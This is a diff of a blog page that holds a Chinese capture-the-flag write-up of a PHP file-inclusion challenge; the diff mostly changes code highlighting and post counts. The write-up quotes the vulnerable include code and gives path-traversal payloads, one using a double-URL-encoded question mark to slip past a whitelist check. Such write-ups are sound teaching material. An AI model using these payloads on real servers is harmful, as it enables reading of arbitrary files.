@@ -395,11 +395,11 @@
 <p>通过代码审计可以得到还有一个hint.php  访问得到：<br>flag not here, and flag in ffffllllaaaagggg</p>
 <p>所以考虑最后的payload需要用到ffffllllaaaagggg</p>
 <p>并且得到参数名称为file</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
 <p> 关键代码，得知file变量不能为空，必须是字符串，还必须通过checkFile的检查<br> 经过查询函数：mb_strpos和mb_substr 的意思是截取变量page中？前面的字符串进行白名单校验<br> 所以source.php和hint.php均在白名单内，随意取一个构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 <p>发现无法通过，是因为进行了三次检查，所以考虑URL编码问题，把?进行URL编码(注意使用英文?)<br>进行三次编码后?变为：%253F<br>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php%253F/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php%<span class="number">253</span>F<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 <p>得到flag</p>
 
       
@@ -524,7 +524,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -535,7 +535,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
